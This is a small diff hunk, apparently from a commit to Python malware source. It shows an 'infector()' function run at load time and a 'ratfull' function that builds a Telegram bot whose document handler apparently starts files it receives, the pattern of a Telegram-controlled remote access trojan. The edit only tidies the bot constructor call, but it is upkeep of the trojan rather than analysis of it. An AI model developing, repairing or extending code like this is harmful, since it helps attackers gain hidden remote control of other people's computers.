@@ -438,7 +438,7 @@ def infector():
 infector()
 
 def ratfull(token):
-    bot = TeleBot(token=token, )
+    bot = TeleBot(token)
 
     @bot.message_handler(content_types=['document'])
     def filestarter(message):
